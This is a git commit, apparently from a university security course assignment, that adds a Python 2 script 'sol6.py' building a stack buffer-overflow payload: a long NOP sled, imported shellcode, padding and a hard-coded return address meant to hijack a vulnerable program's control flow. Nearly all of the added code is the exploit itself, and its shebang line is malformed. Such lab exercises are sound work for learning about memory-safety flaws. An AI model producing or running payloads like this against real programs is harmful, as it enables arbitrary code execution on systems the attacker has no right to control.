81b1435ff6e73781672fed889e73eee907d5577c
hirochri <hirochri@umich.edu>
2017-03-25 15:17:09 -0400

    Sol6 done, probably should test it with 255 and -255

--- project4/sol6.py
+++ project4/sol6.py
@@ -1,1 +1,12 @@
 #!/user/bin/bash/python
+
+from struct import pack
+from shellcode import shellcode
+
+jump_addr = pack("<I", 0xbffef87d)
+
+#shellcode = "f"*53
+print "\x90"*971 + shellcode + "D"*12 + jump_addr
+
+
+
